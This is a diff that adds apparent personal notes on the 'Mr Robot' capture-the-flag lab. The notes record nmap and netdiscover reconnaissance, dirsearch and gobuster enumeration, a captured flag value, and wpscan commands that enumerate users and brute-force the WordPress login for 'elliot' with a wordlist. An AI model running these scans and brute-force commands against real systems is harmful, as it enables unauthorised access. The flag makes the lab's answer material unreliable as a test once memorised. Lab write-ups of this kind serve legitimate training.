@@ -1,0 +1,83 @@
+MR ROBOT
+
+export ip='10.10.85.169'
+
+reconaissance 
+sudo netdiscover -r 10.10.85.0/24 -p
+NMAP 
+	nmap -sCV 10.10.85.169
+		Not shown: 997 filtered tcp ports (no-response)
+		PORT    STATE  SERVICE  VERSION
+		22/tcp  closed ssh
+		80/tcp  open   http     Apache httpd
+		|_http-title: Site doesn't have a title (text/html).
+		|_http-server-header: Apache
+		443/tcp open   ssl/http Apache httpd
+		|_http-server-header: Apache
+		|_http-title: 400 Bad Request
+		| ssl-cert: Subject: commonName=www.example.com
+		| Not valid before: 2015-09-16T10:45:03
+		|_Not valid after:  2025-09-13T10:45:03
+		
+	PORT 80 
+		the site is an interactive site
+		directory enumeration 
+			dirsearch 
+				dirsearch -u http://10.10.85.169/
+					robots.txt
+						fsociety.doc 
+							download it
+						key-1-of-3.txt
+!!!!						KEY 1 : 073403c8a58a1f80d943455fb30724b9
+					/prepare
+					/fsociety
+					/inform
+				fsociety.doc
+					This is a wordlist 
+						try with gobuster
+						GOBUSTER
+							gobuster dir -u http://10.10.85.169/ -w fsociety.doc > gobuster.txt
+							/feed
+								downloaded a file name '0QvJ5tOX '
+									the file cotains the xml version details
+							/wp-login
+								wpscan:
+									username enumeration
+										wpscan --url https://10.10.85.169/ --enumerate u
+												Scan Aborted: The url supplied 'https://10.10.85.169/' seems to be down (SSL peer certificate or SSH remote key was not OK)
+									password bruteforce										
+										wpscan --url http://10.10.85.169 --wordlist /location/of/wordlist/fsocitysortunique.dic --username elliot
+										or
+										wpscan --url http://10.10.85.169 --passwords fsociety.dic --usernames elliot		
+					
+	PORT 22
+		ssh anonymous@10.10.85.169
+			this login was not allowed
+	
+	enum4linux 
+		cd usr/share/enum4linux
+			./enum4linux.pl -a 10.10.85.169
+				Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+
+
+
+
+
+NOTE 
+	2>/DEV/NULL
+		filter out all errors in process
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		
